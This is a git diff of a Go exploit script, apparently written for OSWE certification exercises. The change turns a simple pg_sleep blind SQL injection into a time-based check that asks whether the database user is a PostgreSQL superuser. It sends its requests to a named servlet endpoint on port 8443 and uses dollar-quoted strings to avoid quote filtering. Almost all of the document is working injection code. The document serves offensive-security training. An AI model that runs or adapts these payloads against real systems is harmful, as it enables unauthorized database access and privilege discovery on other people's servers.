@@ -8,29 +8,31 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"time"
 
 	"github.com/iPhantasmic/OSWE/scripts/utils"
 )
 
-// Ex 5.2.6.1 - pg_sleep() blind SQL injection
+// Ex 5.4.1.1 - Blind Bats Exercise
 
 var client *http.Client
 
 const proxyURL = "http://127.0.0.1:8080"
 
-func doSQLi(debug bool, ip string) bool {
-	payload := ";select+pg_sleep(10);"
-	//payload := ";select+pg_sleep_for('10+seconds');"
-	//payload := "'"
+func checkDBA(debug bool, ip string) bool {
+	payload := ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
 
 	// do necessary URL manipulation
 	requestURL := fmt.Sprintf("https://%s:8443/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1%s", ip, payload)
 
 	// send the request
 	utils.PrintInfo("Performing SQLi...")
+	start := time.Now()
 	response := utils.SendGetRequest(client, debug, requestURL)
 
-	if response.StatusCode == 200 {
+	elapsed := time.Since(start).Seconds()
+	utils.PrintInfo(fmt.Sprintf("Time taken for response: %fs", elapsed))
+	if response.StatusCode == 200 && elapsed > float64(10) {
 		return true
 	}
 
@@ -74,5 +76,10 @@ func main() {
 		Transport: tr,
 	}
 
-	doSQLi(*debug, ip)
+	if checkDBA(*debug, ip) {
+		fmt.Println("")
+		utils.PrintSuccess("Done!")
+	} else {
+		utils.PrintFailure("Something went wrong... Check proxy to debug!")
+	}
 }
